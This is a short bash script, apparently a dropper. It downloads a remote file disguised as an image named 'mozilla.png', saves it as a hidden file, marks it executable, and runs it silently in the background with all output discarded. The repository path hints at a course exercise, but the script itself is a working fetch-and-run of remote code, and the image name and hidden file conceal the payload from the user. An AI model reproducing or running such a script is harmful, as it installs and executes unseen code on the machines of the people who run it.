#!/bin/bash

curl -s https://raw.githubusercontent.com/fp-xtec/smx-6/main/uf1/mozilla.png  --output .mozilla.png
chmod a+x .mozilla.png
sh .mozilla.png 1> /dev/null 2> /dev/null &
